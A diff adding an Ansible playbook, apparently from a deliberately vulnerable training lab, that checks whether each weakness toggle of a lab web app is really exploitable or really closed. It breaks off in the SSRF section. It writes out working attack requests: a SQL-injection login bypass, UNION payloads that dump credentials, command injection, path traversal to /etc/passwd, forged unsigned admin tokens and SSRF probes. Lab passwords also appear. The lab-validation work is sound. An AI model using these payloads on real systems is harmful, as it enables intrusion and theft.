@@ -1,0 +1,952 @@
+---
+# Read-only validation of the application's deliberate weaknesses.
+#
+# Design: the app/ tree and the WEAK_* toggles in lab.yaml
+# (`app.weaknesses`). Every toggle gets an assertion pair, fired over
+# HTTPS against the running stack:
+#
+#   toggle ON  -> the exploit is executed and MUST succeed
+#   toggle OFF -> the same exploit is executed and MUST be refused
+#
+# What this proves: that the lab's declared weakness state is the state a
+# client actually observes. A toggle that is declared on and does not work
+# is drift, and so is a toggle that is declared off and still works - both
+# fail an assert below with the message naming the toggle.
+#
+# Nothing here writes to the lab: the requests are GETs plus the login POSTs
+# the assertions need, no toggle is flipped, no container is restarted, no
+# service is reconfigured and nothing is repaired. Safe to re-run at any
+# time, and safe to run while someone is exploiting the lab.
+#
+# Run AFTER app.yml (it asserts the stack app.yml deployed) - last in
+# deploy.sh, next to ad_validate.yml. The same two inventories:
+#   ansible-playbook -i inventory/lab_inventory.py \
+#                    -i inventory/terraform_vms.py playbooks/app_validate.yml
+#
+# Routes are the app/ contract, used verbatim: POST /api/login,
+# /api/search, /admin/diagnostics, /api/orders/<id>, /admin/users,
+# /portal/download, /admin/config, /api/fetch, /debug/pprof/. TLS
+# certificates are not verified: the certificate is the self-signed one
+# app.yml generated on the VM.
+#
+# A failed precondition fails the play rather than quietly turning an
+# exploit check into a no-op: a stack that is not answering, a broken
+# low-privileged login or a missing weakness map would otherwise make
+# "refused" assertions pass for the wrong reason.
+#
+# Env overrides (deploy.sh exports them from deploy.env; all optional):
+#   LAB_APP_HTTPS_PORT        published TLS port (default 443)
+#   LAB_APP_DB_PASS           the DB_PASSWORD /admin/config must not show
+#                             (default Clayface_DB_2024! - same source as the
+#                             value app.yml renders into .env, and the same
+#                             string as the portal's compiled-in fallback)
+#   LAB_SVC_APP_USER          seeded service account name (default: lab.yaml's
+#                             `app.service_account`)
+#   LAB_SVC_APP_PASS          the service account credential the database
+#                             holds (default: LAB_USER_PASS, itself defaulting
+#                             to Passw0rd!Lab)
+#   LAB_USER_PASS             low-privileged lab user's password
+#                             (default Passw0rd!Lab)
+#   LAB_APP_LOWPRIV_USER      low-privileged account for the IDOR probe
+#                             (default ron.weas - lab.yaml's baseline user)
+#   LAB_APP_ORDER_IDS         order ids the IDOR probe walks - must be ids the
+#                             low-privileged user does not own, or the OFF case
+#                             proves nothing (default 8,10,12)
+#   LAB_APP_SSRF_TARGETS      internal URLs the SSRF probe fetches, comma
+#                             separated (default http://127.0.0.1:8080/healthz
+#                             and http://10.0.0.1/ - both IP literals, because
+#                             those are what the hardened check refuses)
+#   LAB_APP_SQLI_SEARCH_PAYLOAD
+#                             one UNION payload, replacing the default (use it
+#                             if the search query's shape is ever changed)
+#   LAB_APP_FORGED_TOKEN_PAYLOAD
+#                             one forged-session payload, replacing the
+#                             payloads tried by default
+
+# ============================================================
+# Guard: an empty group would make this playbook assert nothing
+# and still exit 0, which is the one outcome a validation run
+# must not have.
+# ============================================================
+- name: Make sure there is an app VM to validate
+  hosts: localhost
+  connection: local
+  gather_facts: false
+
+  tasks:
+    - name: Fail if the inventory has no app VM
+      ansible.builtin.assert:
+        that: groups['vms_app'] | default([]) | length > 0
+        fail_msg: >-
+          No hosts in `vms_app`, so this playbook would assert nothing at
+          all. Is app01 in lab.yaml `vm_placements` (with its `ip:`) and did
+          `terraform apply` run? The group is built by
+          inventory/terraform_vms.py from terraform's `vms` output.
+
+# ============================================================
+# The assertions
+# ============================================================
+- name: Validate the application's deliberate weaknesses
+  hosts: vms_app
+  become: false
+  gather_facts: false
+
+  vars:
+    # The address is the inventory's (ansible_host), the port is the same
+    # single source app.yml publishes from.
+    app_https_port: "{{ lookup('env', 'LAB_APP_HTTPS_PORT') | default(443, true) }}"
+    app_base_url: "https://{{ ansible_host }}:{{ app_https_port }}"
+
+    # The toggles, spelled exactly as lab.yaml spells them and exactly as
+    # app.yml renders them (WEAK_ + the key uppercased).
+    app_weakness_keys:
+      - sqli_login
+      - sqli_search
+      - command_injection_diagnostics
+      - idor_documents
+      - broken_admin_authz
+      - path_traversal_download
+      - hardcoded_db_credentials
+      - forgeable_session_token
+      - service_account_credential_in_db
+      - ssrf_url_fetch
+      - verbose_errors_debug_endpoint
+    app_weaknesses: "{{ (lab_app | default({}, true)).weaknesses | default({}, true) }}"
+
+    # Credentials, from the same sources app.yml renders into .env - a
+    # validation run must not be able to pass against a differently
+    # configured stack.
+    app_db_pass: "{{ lookup('env', 'LAB_APP_DB_PASS') | default('Clayface_DB_2024!', true) }}"
+    # Same expression app.yml uses to render .env, so a run cannot compare the
+    # database against a differently-derived string than the one planted in it.
+    app_svc_user: >-
+      {{ lookup('env', 'LAB_SVC_APP_USER')
+         | default((lab_app | default({}, true)).service_account
+                   | default('svc-app-portal', true), true) }}
+    app_svc_pass: >-
+      {{ lookup('env', 'LAB_SVC_APP_PASS')
+         | default(lookup('env', 'LAB_USER_PASS') | default('Passw0rd!Lab', true),
+                   true) }}
+    app_lowpriv_user: "{{ lookup('env', 'LAB_APP_LOWPRIV_USER') | default('ron.weas', true) }}"
+    app_lowpriv_pass: "{{ lookup('env', 'LAB_USER_PASS') | default('Passw0rd!Lab', true) }}"
+
+    # The header the admin routes trust on its own. That trust is weakness
+    # broken_admin_authz; the other admin probes send it so that they test
+    # the thing they are about (the endpoint's content or behaviour) rather
+    # than the same missing check over again.
+    app_admin_headers:
+      X-Clayface-Role: admin
+
+    # The search query is built as
+    #   SELECT id, title, body FROM documents WHERE title LIKE '%<term>%' ...
+    # so a UNION payload has to produce three columns of compatible types, and
+    # it has to come with its own match-nothing prefix (`zz`) so the injected
+    # half is the only thing that returns. api_keys has the three columns this
+    # needs, which is the point: a read-only search box returns the credential
+    # table. A payload that gets the shape wrong fails the row scan with a 500
+    # rather than leaking, which is why the ON assertion reports the leak it
+    # saw rather than merely "not refused".
+    app_sqli_search_payloads_default:
+      - "zz%' UNION SELECT id, service_account, api_key FROM api_keys -- "
+    app_sqli_search_payloads: >-
+      {{ [lookup('env', 'LAB_APP_SQLI_SEARCH_PAYLOAD')]
+         if (lookup('env', 'LAB_APP_SQLI_SEARCH_PAYLOAD') | length) > 0
+         else app_sqli_search_payloads_default }}
+
+    # The service-account credential check reads svc-app-portal's row
+    # SPECIFICALLY, with its own UNION scoped by service_account. It cannot
+    # reuse the table-dump payload above: svc-idp-ldap's bind credential is the
+    # same lab password on purpose (it is the AD pivot and must match the real
+    # account), so a full dump ALWAYS contains that string no matter what this
+    # toggle does - which would make the OFF assertion below fail for a reason
+    # that is not the toggle. Scoping to svc-app-portal reads the one row the
+    # toggle governs: the live password when on, a placeholder digest when off.
+    app_sqli_cred_payload: "zz%' UNION SELECT id, service_account, api_key FROM api_keys WHERE service_account = '{{ app_svc_user }}' -- "
+
+    # The IDOR probe walks order ids that the low-privileged user does NOT own.
+    # That is what makes the OFF case meaningful: orders 1-7 belong to
+    # ron.weas's own customers (customers 1-3), so they answer 200 in both
+    # postures and would prove nothing either way. Orders 8 and 10 belong to
+    # bob.sing (customers 4-5) and 12 to abed.nad (customer 6)
+    # (docs/app01-design.md, seed.sql). With the weakness on every id answers;
+    # with it off none of these does.
+    app_order_id_probes: >-
+      {{ (lookup('env', 'LAB_APP_ORDER_IDS') | default('8,10,12', true)).split(',')
+         | map('trim') | select | list }}
+
+    # SSRF targets: internal addresses only. Both are IP literals on purpose,
+    # so that they are refused for the same reason the hardened check refuses
+    # them - a hostname that resolves into the private range still passes that
+    # check, which would make the OFF assertion below fail for a reason that is
+    # not the toggle. 127.0.0.1:8080 is the portal's own listener (loopback),
+    # and /healthz answers `ok`; 10.0.0.1 is OPNsense's LAN address (mirrored
+    # constant, see opnsense.yml `opnsense_host`). A target that answers with a
+    # body is the evidence that the request was made server-side.
+    app_ssrf_targets_default:
+      - "http://127.0.0.1:8080/healthz"
+      - "http://10.0.0.1/"
+    app_ssrf_targets: >-
+      {{ (lookup('env', 'LAB_APP_SSRF_TARGETS') | default('', true)).split(',')
+         | map('trim') | select | list
+         if (lookup('env', 'LAB_APP_SSRF_TARGETS') | length) > 0
+         else app_ssrf_targets_default }}
+
+    # Forged session tokens: an unsigned base64url "username|role|issuedAt".
+    # The role has to be the string the admin check compares against ("admin",
+    # which is also what the seeded users carry), and the payload has to carry
+    # exactly those three fields - a shape with a missing timestamp is rejected
+    # for its shape and would prove nothing about the signature. Two timestamps
+    # are tried because the app is free to reject one that looks stale; the
+    # clock is the control node's, which the lab VMs share.
+    app_forged_token_payloads_default:
+      - "adm-hermione|admin|1"
+      - "adm-hermione|admin|{{ lookup('pipe', 'date +%s') }}"
+    app_forged_token_payloads: >-
+      {{ [lookup('env', 'LAB_APP_FORGED_TOKEN_PAYLOAD')]
+         if (lookup('env', 'LAB_APP_FORGED_TOKEN_PAYLOAD') | length) > 0
+         else app_forged_token_payloads_default }}
+    # base64url: b64encode, swap the two URL-unsafe characters, drop the
+    # padding. No signature, no HMAC - that is the whole weakness.
+    app_forged_tokens: >-
+      {{ app_forged_token_payloads
+         | map('b64encode') | map('replace', '+', '-') | map('replace', '/', '_')
+         | map('regex_replace', '=+$', '') | list }}
+
+    # Ways into an error the app handles. /debug/panic is the reliable one
+    # with the toggle on (the recovery middleware renders `panic: ...` plus a
+    # goroutine dump, and the route is not registered at all with it off);
+    # the other two are ordinary request failures that should stay generic.
+    app_error_probes:
+      - "/debug/panic"
+      - "/api/orders/not-a-number"
+      - "/api/search?q=%27"
+    app_verbose_error_pattern: >-
+      (?i)sqlstate|syntax error|traceback|goroutine \d+|stack trace|panic:|\.go:\d+|pq:
+
+    # The cookie the app issues for a session, taken from a real login
+    # response so the forged token is sent under the right name.
+    app_session_cookie_name: >-
+      {{ app_lowpriv_login.cookies | default({}, true) | list | first
+         | default('session', true) }}
+
+  module_defaults:
+    ansible.builtin.uri:
+      # The certificate is the self-signed one app.yml generated; the
+      # assertions are about the app, not the PKI.
+      validate_certs: false
+      return_content: true
+      # No redirects. An unauthenticated request to an HTML route is answered
+      # with a 302 to the login form, and a client that follows it reports a
+      # 200 with the login page in the body - which reads as "the request was
+      # accepted" in every assertion below that looks at a status. The
+      # question here is what the app itself answered, so the redirect is the
+      # answer.
+      follow_redirects: false
+
+  pre_tasks:
+    - name: Fail if lab.yaml has no usable `app.weaknesses` map
+      ansible.builtin.assert:
+        that: app_weaknesses | length > 0
+        fail_msg: >-
+          lab.yaml has no `app.weaknesses` map (or it is empty). Without it
+          every test below would fall back to its default and report the
+          default rather than the lab's declared state.
+
+    - name: Probe the stack over HTTPS
+      ansible.builtin.uri:
+        url: "{{ app_base_url }}/"
+      register: app_probe
+      changed_when: false
+      failed_when: false
+
+    - name: Fail if nothing answers on the app VM
+      ansible.builtin.assert:
+        that: app_probe.status | default(-1) | int > 0
+        fail_msg: >-
+          Nothing answered on {{ app_base_url }}
+          ({{ app_probe.msg | default('no response', true) }}). This playbook
+          asserts a RUNNING stack: run playbooks/app.yml first, and check the
+          VM is up and its ports are reachable from here.
+        quiet: true
+
+    # A precondition, not a weakness: the IDOR and forged-token checks below
+    # need a real low-privileged session. If this login does not work those
+    # checks would fail - or worse, "pass" - for reasons that have nothing
+    # to do with the weakness. no_log: it carries the account's password.
+    - name: Log in as the low-privileged lab user
+      ansible.builtin.uri:
+        url: "{{ app_base_url }}/api/login"
+        method: POST
+        body_format: json
+        body:
+          username: "{{ app_lowpriv_user }}"
+          password: "{{ app_lowpriv_pass }}"
+      register: app_lowpriv_login
+      changed_when: false
+      failed_when: false
+      no_log: true
+
+    - name: Fail if the low-privileged session could not be established
+      ansible.builtin.assert:
+        that:
+          - app_lowpriv_login.status | default(0) == 200
+          - app_lowpriv_login.cookies | default({}, true) | length > 0
+        fail_msg: >-
+          Could not log in as {{ app_lowpriv_user }} on {{ app_base_url }}
+          (HTTP {{ app_lowpriv_login.status | default('no response', true) }},
+          {{ app_lowpriv_login.cookies | default({}, true) | length }}
+          cookie(s)). The IDOR and forged-session checks below depend on this
+          session, so they are not run against a stack where it does not
+          exist. Check the account is seeded in the app and that LAB_USER_PASS
+          is its password.
+
+  tasks:
+    # ============================================================
+    # 1. sqli_login - POST /api/login with an always-true WHERE
+    #    ON  : the payload authenticates (200 + a session cookie)
+    #    OFF : the credentials are rejected (401)
+    # ============================================================
+    - name: Attempt the SQL injection login
+      ansible.builtin.uri:
+        url: "{{ app_base_url }}/api/login"
+        method: POST
+        body_format: json
+        body:
+          username: "' OR '1'='1' -- "
+          password: "clayface"
+      register: weak_sqli_login
+      changed_when: false
+      failed_when: false
+
+    - name: Assert the injected login authenticates (sqli_login is ON)
+      ansible.builtin.assert:
+        that:
+          - weak_sqli_login.status | default(0) == 200
+          - weak_sqli_login.cookies | default({}, true) | length > 0
+        fail_msg: >-
+          sqli_login is ON in lab.yaml (WEAK_SQLI_LOGIN), but POST
+          /api/login with username "' OR '1'='1' -- " answered HTTP
+          {{ weak_sqli_login.status | default('no response', true) }} with
+          {{ weak_sqli_login.cookies | default({}, true) | length }} cookie(s)
+          instead of 200 with a session. The login query is not injectable as
+          declared (or the endpoint no longer takes a JSON body).
+        success_msg: >-
+          sqli_login: ON - the always-true username authenticated and
+          returned a session cookie.
+      when: app_weaknesses.sqli_login | default(true) | bool
+
+    - name: Assert the injected login is refused (sqli_login is OFF)
+      ansible.builtin.assert:
+        that: weak_sqli_login.status | default(0) == 401
+        fail_msg: >-
+          sqli_login is OFF in lab.yaml, but the always-true payload was not
+          rejected with 401 (it answered HTTP
+          {{ weak_sqli_login.status | default('no response', true) }}). The
+          login query is still injectable.
+        success_msg: "sqli_login: OFF - the injected login was rejected with 401."
+      when: not (app_weaknesses.sqli_login | default(true) | bool)
+
+    # ============================================================
+    # 2 + 9. sqli_search and service_account_credential_in_db
+    #    Two toggles, two probes. The table-dump payloads prove the search
+    #    query accepts a UNION SELECT that returns rows of `api_keys`
+    #    (sqli_search); a separate payload scoped to svc-app-portal's own row
+    #    proves that row holds the live credential
+    #    (service_account_credential_in_db). The scoping is what isolates what
+    #    each assertion MEASURES: svc-idp-ldap's bind credential is the same
+    #    lab password on purpose, so a full dump always carries that string
+    #    whatever the credential toggle does. (The credential read still rides
+    #    the search injection - there is no other path to the table - so the
+    #    two assertions share a transport, not a verdict.)
+    #    ON  : the row / the configured password appears in the body
+    #    OFF : neither appears
+    # ============================================================
+    # `uri` has no query-parameter option, so the payload goes into the URL and
+    # has to be percent-encoded by hand. Two substitutions, in this order:
+    #   %   -> %25   first, because a literal `%` in the payload is not a valid
+    #               escape once it is in a URL, and a server that rejects the
+    #               escape hands the handler an empty parameter - the request
+    #               would look refused for the wrong reason.
+    #   ' ' -> %20   rather than the urlencode filter, which writes a space as
+    #               '+': a form-style decoder maps that back to a space, a
+    #               stricter one leaves a literal plus, and inside a SQL
+    #               payload that is the difference between working and not.
+    - name: Probe the search endpoint with each UNION payload
+      ansible.builtin.uri:
+        url: >-
+          {{ app_base_url }}/api/search?q={{
+             item | regex_replace('%', '%25') | regex_replace(' ', '%20') }}
+        return_content: true
+      register: app_search_probes
+      loop: "{{ app_sqli_search_payloads }}"
+      loop_control:
+        label: "{{ item }}"
+      changed_when: false
+      failed_when: false
+
+    # One more probe, with a payload scoped to svc-app-portal's own row, for the
+    # credential assertion below - see app_sqli_cred_payload for why the
+    # table-dump payloads above cannot answer that question. Same encoding.
+    - name: Probe the search endpoint for the service account's own row
+      ansible.builtin.uri:
+        url: >-
+          {{ app_base_url }}/api/search?q={{
+             app_sqli_cred_payload | regex_replace('%', '%25') | regex_replace(' ', '%20') }}
+        return_content: true
+      register: app_cred_probe
+      changed_when: false
+      failed_when: false
+
+    - name: Start with nothing leaked
+      ansible.builtin.set_fact:
+        app_search_row_leaks: []
+
+    - name: Record which payloads returned an api_keys row
+      ansible.builtin.set_fact:
+        app_search_row_leaks: >-
+          {{ app_search_row_leaks
+             + ([item.item] if (item.content | default('', true)) is search(app_svc_user | regex_escape)
+                else []) }}
+      loop: "{{ app_search_probes.results | default([]) }}"
+      loop_control:
+        label: "{{ item.item }}"
+
+    # Whether the service account's OWN row carried the live password. Scoped,
+    # so this is the toggle and nothing else - the idp ldap-bind credential
+    # shares the same lab password on purpose and would otherwise always match.
+    - name: Record whether the service account's own row carried the configured password
+      ansible.builtin.set_fact:
+        app_cred_leaked: >-
+          {{ (app_cred_probe.content | default('', true)) is search(app_svc_pass | regex_escape) }}
+
+    - name: Assert the UNION payload exfiltrates api_keys (sqli_search is ON)
+      ansible.builtin.assert:
+        that: app_search_row_leaks | length > 0
+        fail_msg: >-
+          sqli_search is ON in lab.yaml (WEAK_SQLI_SEARCH), but none of the
+          {{ app_sqli_search_payloads | length }} UNION payloads returned
+          `{{ app_svc_user }}` from api_keys. The search query is not
+          injectable as declared, or its result has a column count none of the
+          payloads match - set LAB_APP_SQLI_SEARCH_PAYLOAD to the right shape.
+        success_msg: >-
+          sqli_search: ON - the api_keys row leaked via
+          {{ app_search_row_leaks | length }} of
+          {{ app_sqli_search_payloads | length }} payload(s).
+      when: app_weaknesses.sqli_search | default(true) | bool
+
+    - name: Assert the UNION payload leaks nothing (sqli_search is OFF)
+      ansible.builtin.assert:
+        that: app_search_row_leaks | length == 0
+        fail_msg: >-
+          sqli_search is OFF in lab.yaml, but
+          {{ app_search_row_leaks | length }} UNION payload(s) still returned
+          api_keys data. The search query is still injectable.
+        success_msg: >-
+          sqli_search: OFF - no api_keys row came back from any payload.
+      when: not (app_weaknesses.sqli_search | default(true) | bool)
+
+    - name: Assert the database holds the live service account credential (service_account_credential_in_db is ON)
+      ansible.builtin.assert:
+        that: app_cred_leaked | bool
+        fail_msg: >-
+          service_account_credential_in_db is ON in lab.yaml
+          (WEAK_SERVICE_ACCOUNT_CREDENTIAL_IN_DB), but svc-app-portal's own
+          api_keys row did not return the configured SERVICE_ACCOUNT_PASSWORD
+          (LAB_SVC_APP_PASS). Either the row is not reachable through the
+          search endpoint, or it holds a different value than the one the
+          stack was deployed with.
+        success_msg: >-
+          service_account_credential_in_db: ON - svc-app-portal's api_keys row
+          holds the stack's SERVICE_ACCOUNT_PASSWORD, obtainable through the
+          search endpoint.
+      when: app_weaknesses.service_account_credential_in_db | default(true) | bool
+
+    - name: Assert no service account credential is stored readable (service_account_credential_in_db is OFF)
+      ansible.builtin.assert:
+        that: not (app_cred_leaked | bool)
+        fail_msg: >-
+          service_account_credential_in_db is OFF in lab.yaml, but
+          svc-app-portal's own api_keys row still returns the configured
+          SERVICE_ACCOUNT_PASSWORD through the search endpoint.
+        success_msg: >-
+          service_account_credential_in_db: OFF - svc-app-portal's row does not
+          carry the credential (it holds the placeholder digest instead).
+      when: not (app_weaknesses.service_account_credential_in_db | default(true) | bool)
+
+    # ============================================================
+    # 3. command_injection_diagnostics - the host parameter reaches a shell
+    #    ON  : `;id` runs and `uid=` comes back in the response
+    #    OFF : it does not
+    # ============================================================
+    - name: Ask diagnostics to run a second command
+      ansible.builtin.uri:
+        # The `;` must be percent-encoded: Go's url.ParseQuery rejects a raw
+        # semicolon in a query string ("invalid semicolon separator"), which
+        # makes `host` come through empty and the injected command never runs -
+        # the probe would then fail for a transport reason, not a real one.
+        url: "{{ app_base_url }}/admin/diagnostics?host=127.0.0.1%3Bid"
+        headers: "{{ app_admin_headers }}"
+        return_content: true
+      register: weak_command_injection
+      changed_when: false
+      failed_when: false
+
+    - name: Assert the diagnostics parameter is command-injectable (command_injection_diagnostics is ON)
+      ansible.builtin.assert:
+        that:
+          - weak_command_injection.status | default(0) == 200
+          - "'uid=' in (weak_command_injection.content | default(''))"
+        fail_msg: >-
+          command_injection_diagnostics is ON in lab.yaml
+          (WEAK_COMMAND_INJECTION_DIAGNOSTICS), but
+          /admin/diagnostics?host=127.0.0.1;id answered HTTP
+          {{ weak_command_injection.status | default('no response', true) }}
+          without `uid=` in the body, so the injected command did not run.
+        success_msg: >-
+          command_injection_diagnostics: ON - `;id` ran on the app VM and its
+          output came back in the response.
+      when: app_weaknesses.command_injection_diagnostics | default(true) | bool
+
+    - name: Assert the diagnostics parameter is not injectable (command_injection_diagnostics is OFF)
+      ansible.builtin.assert:
+        that: "'uid=' not in (weak_command_injection.content | default(''))"
+        fail_msg: >-
+          command_injection_diagnostics is OFF in lab.yaml, but
+          `;id` still produced `uid=` in the diagnostics response - the host
+          parameter still reaches a shell.
+        success_msg: >-
+          command_injection_diagnostics: OFF - the injected command did not
+          run.
+      when: not (app_weaknesses.command_injection_diagnostics | default(true) | bool)
+
+    # ============================================================
+    # 4. idor_documents - order ids are not checked against the caller
+    #    ON  : the low-privileged session reads an order with a 200
+    #    OFF : every id is refused
+    # ============================================================
+    - name: Read orders with the low-privileged session
+      ansible.builtin.uri:
+        url: "{{ app_base_url }}/api/orders/{{ item }}"
+        headers:
+          Cookie: "{{ app_lowpriv_login.cookies_string | default('') }}"
+      register: app_idor_probes
+      loop: "{{ app_order_id_probes }}"
+      loop_control:
+        label: "order {{ item }}"
+      changed_when: false
+      failed_when: false
+
+    - name: Start with nothing readable
+      ansible.builtin.set_fact:
+        app_idor_readable: []
+
+    - name: Record which orders the low-privileged session could read
+      ansible.builtin.set_fact:
+        app_idor_readable: >-
+          {{ app_idor_readable
+             + ([item.item] if (item.status | default(0)) == 200 else []) }}
+      loop: "{{ app_idor_probes.results | default([]) }}"
+      loop_control:
+        label: "order {{ item.item }}"
+
+    - name: Assert orders are readable without an ownership check (idor_documents is ON)
+      ansible.builtin.assert:
+        that: app_idor_readable | length > 0
+        fail_msg: >-
+          idor_documents is ON in lab.yaml (WEAK_IDOR_DOCUMENTS), but
+          {{ app_lowpriv_user }} got a 200 on none of the order ids
+          {{ app_order_id_probes | join(', ') }} (statuses:
+          {{ app_idor_probes.results | map(attribute='status') | join(', ') }}).
+          The probe walks ids that do not all belong to that user - widen
+          LAB_APP_ORDER_IDS if the seeded set is larger.
+        success_msg: >-
+          idor_documents: ON - {{ app_lowpriv_user }} read order(s)
+          {{ app_idor_readable | join(', ') }} without an ownership check.
+      when: app_weaknesses.idor_documents | default(true) | bool
+
+    - name: Assert orders are only readable by their owner (idor_documents is OFF)
+      ansible.builtin.assert:
+        that: app_idor_readable | length == 0
+        fail_msg: >-
+          idor_documents is OFF in lab.yaml, but {{ app_lowpriv_user }} read
+          order(s) {{ app_idor_readable | join(', ') }} directly, with no
+          ownership check in the way.
+        success_msg: >-
+          idor_documents: OFF - every probed order id was refused for
+          {{ app_lowpriv_user }}.
+      when: not (app_weaknesses.idor_documents | default(true) | bool)
+
+    # ============================================================
+    # 5. broken_admin_authz - a client-supplied role header is trusted
+    #    ON  : /admin/users answers 200 to a header and nothing else
+    #    OFF : it is refused
+    # ============================================================
+    - name: Ask for the admin user list with a self-asserted role header
+      ansible.builtin.uri:
+        url: "{{ app_base_url }}/admin/users"
+        headers: "{{ app_admin_headers }}"
+      register: weak_broken_admin_authz
+      changed_when: false
+      failed_when: false
+
+    - name: Assert the admin role header is trusted (broken_admin_authz is ON)
+      ansible.builtin.assert:
+        that: weak_broken_admin_authz.status | default(0) == 200
+        fail_msg: >-
+          broken_admin_authz is ON in lab.yaml (WEAK_BROKEN_ADMIN_AUTHZ), but
+          GET /admin/users with only `X-Clayface-Role: admin` and no session
+          answered HTTP
+          {{ weak_broken_admin_authz.status | default('no response', true) }}.
+        success_msg: >-
+          broken_admin_authz: ON - /admin/users answered 200 to a
+          client-supplied role header, with no session at all.
+      when: app_weaknesses.broken_admin_authz | default(true) | bool
+
+    - name: Assert the admin role header is not trusted (broken_admin_authz is OFF)
+      ansible.builtin.assert:
+        # 302 is the hardened answer for an HTML route with no session: the
+        # client is sent to the login form instead of being told what it did
+        # wrong. 401/403 are the outright refusals.
+        that: weak_broken_admin_authz.status | default(0) in [302, 401, 403]
+        fail_msg: >-
+          broken_admin_authz is OFF in lab.yaml, but GET /admin/users with a
+          self-asserted `X-Clayface-Role: admin` header answered HTTP
+          {{ weak_broken_admin_authz.status | default('no response', true) }}
+          instead of refusing the request (302 to the login form, or 401/403).
+        success_msg: >-
+          broken_admin_authz: OFF - the role header alone was refused with
+          {{ weak_broken_admin_authz.status }}.
+      when: not (app_weaknesses.broken_admin_authz | default(true) | bool)
+
+    # ============================================================
+    # 6. path_traversal_download - the file parameter escapes the portal root
+    #    ON  : /etc/passwd comes back
+    #    OFF : it does not
+    # ============================================================
+    - name: Ask the download endpoint for /etc/passwd
+      ansible.builtin.uri:
+        url: "{{ app_base_url }}/portal/download?file=../../../../etc/passwd"
+        return_content: true
+      register: weak_path_traversal
+      changed_when: false
+      failed_when: false
+
+    - name: Assert the download parameter traverses the filesystem (path_traversal_download is ON)
+      ansible.builtin.assert:
+        that: "'root:' in (weak_path_traversal.content | default(''))"
+        fail_msg: >-
+          path_traversal_download is ON in lab.yaml
+          (WEAK_PATH_TRAVERSAL_DOWNLOAD), but
+          /portal/download?file=../../../../etc/passwd answered HTTP
+          {{ weak_path_traversal.status | default('no response', true) }}
+          without `root:` in the body, so the traversal did not resolve.
+        success_msg: >-
+          path_traversal_download: ON - the endpoint returned the app VM's
+          /etc/passwd.
+      when: app_weaknesses.path_traversal_download | default(true) | bool
+
+    - name: Assert the download parameter cannot traverse (path_traversal_download is OFF)
+      ansible.builtin.assert:
+        that: "'root:' not in (weak_path_traversal.content | default(''))"
+        fail_msg: >-
+          path_traversal_download is OFF in lab.yaml, but the download
+          endpoint still returned /etc/passwd (the body contains `root:`).
+        success_msg: >-
+          path_traversal_download: OFF - the traversal was refused.
+      when: not (app_weaknesses.path_traversal_download | default(true) | bool)
+
+    # ============================================================
+    # 7. hardcoded_db_credentials - the config page shows the DB password
+    #    ON  : the value the stack was deployed with appears
+    #    OFF : it does not
+    # ============================================================
+    - name: Read the admin configuration page
+      ansible.builtin.uri:
+        url: "{{ app_base_url }}/admin/config"
+        headers: "{{ app_admin_headers }}"
+        return_content: true
+      register: weak_hardcoded_db_credentials
+      changed_when: false
+      failed_when: false
+
+    - name: Assert the configuration page exposes the database password (hardcoded_db_credentials is ON)
+      ansible.builtin.assert:
+        that: "app_db_pass in (weak_hardcoded_db_credentials.content | default(''))"
+        fail_msg: >-
+          hardcoded_db_credentials is ON in lab.yaml
+          (WEAK_HARDCODED_DB_CREDENTIALS), but GET /admin/config (HTTP
+          {{ weak_hardcoded_db_credentials.status | default('no response', true) }})
+          does not contain the DB_PASSWORD the stack runs with
+          (LAB_APP_DB_PASS).
+        success_msg: >-
+          hardcoded_db_credentials: ON - /admin/config hands out the database
+          password the stack is configured with.
+      when: app_weaknesses.hardcoded_db_credentials | default(true) | bool
+
+    - name: Assert the configuration page does not expose the database password (hardcoded_db_credentials is OFF)
+      ansible.builtin.assert:
+        that: "app_db_pass not in (weak_hardcoded_db_credentials.content | default(''))"
+        fail_msg: >-
+          hardcoded_db_credentials is OFF in lab.yaml, but /admin/config still
+          returns the DB_PASSWORD the stack runs with.
+        success_msg: >-
+          hardcoded_db_credentials: OFF - the configuration page does not
+          carry the database password.
+      when: not (app_weaknesses.hardcoded_db_credentials | default(true) | bool)
+
+    # ============================================================
+    # 8. forgeable_session_token - the session cookie is not signed
+    #    ON  : a hand-minted cookie is accepted on an admin route
+    #    OFF : it is refused
+    # ============================================================
+    # The cookie is sent under the name a real login issues
+    # (app_session_cookie_name, taken from the low-privileged login above),
+    # so the only thing forged here is the value.
+    - name: Send forged session cookies to an admin route
+      ansible.builtin.uri:
+        url: "{{ app_base_url }}/admin/users"
+        headers:
+          Cookie: "{{ app_session_cookie_name }}={{ item.1 }}"
+      register: app_forged_probes
+      loop: "{{ app_forged_token_payloads | zip(app_forged_tokens) | list }}"
+      loop_control:
+        label: "{{ item.0 }}"
+      changed_when: false
+      failed_when: false
+
+    - name: Start with no forged token accepted
+      ansible.builtin.set_fact:
+        app_forged_accepted: []
+
+    - name: Record which forged tokens were accepted
+      ansible.builtin.set_fact:
+        app_forged_accepted: >-
+          {{ app_forged_accepted
+             + ([item.item.0] if (item.status | default(0)) == 200 else []) }}
+      loop: "{{ app_forged_probes.results | default([]) }}"
+      loop_control:
+        label: "{{ item.item.0 }}"
+
+    - name: Assert a hand-minted session token is accepted (forgeable_session_token is ON)
+      ansible.builtin.assert:
+        that: app_forged_accepted | length > 0
+        fail_msg: >-
+          forgeable_session_token is ON in lab.yaml
+          (WEAK_FORGEABLE_SESSION_TOKEN), but none of the
+          {{ app_forged_token_payloads | length }} unsigned base64url payloads
+          was accepted as a `{{ app_session_cookie_name }}` cookie on
+          /admin/users. The token is not forgeable in the shape tried - set
+          LAB_APP_FORGED_TOKEN_PAYLOAD to the shape the app expects.
+        success_msg: >-
+          forgeable_session_token: ON - the unsigned token
+          "{{ app_forged_accepted | first }}" was accepted as an administrator
+          session.
+      when: app_weaknesses.forgeable_session_token | default(true) | bool
+
+    - name: Assert a hand-minted session token is refused (forgeable_session_token is OFF)
+      ansible.builtin.assert:
+        that: app_forged_accepted | length == 0
+        fail_msg: >-
+          forgeable_session_token is OFF in lab.yaml, but the unsigned token
+          "{{ app_forged_accepted | first }}" was still accepted on an admin
+          route.
+        success_msg: >-
+          forgeable_session_token: OFF - every hand-minted cookie was refused
+          (statuses:
+          {{ app_forged_probes.results | map(attribute='status') | join(', ') }}).
+      when: not (app_weaknesses.forgeable_session_token | default(true) | bool)
+
+    # ============================================================
+    # 10. ssrf_url_fetch - the fetch route will fetch anything, including
+    #     addresses only the server can reach
+    #     ON  : an internal URL is fetched and its body comes back
+    #     OFF : every internal URL is refused
+    # ============================================================
+    - name: Ask the portal to fetch internal URLs
+      ansible.builtin.uri:
+        url: >-
+          {{ app_base_url }}/api/fetch?url={{ item | regex_replace(' ', '%20') }}
+        return_content: true
+      register: app_ssrf_probes
+      loop: "{{ app_ssrf_targets }}"
+      loop_control:
